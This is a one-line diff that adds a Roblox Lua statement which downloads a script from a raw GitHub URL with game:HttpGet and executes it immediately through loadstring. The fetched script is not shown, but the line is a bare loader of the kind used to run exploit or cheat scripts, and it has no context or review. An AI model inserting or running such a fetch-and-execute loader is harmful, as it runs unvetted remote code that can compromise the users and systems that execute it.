@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DiegoRRQ/el-paso/refs/heads/main/diego"))()
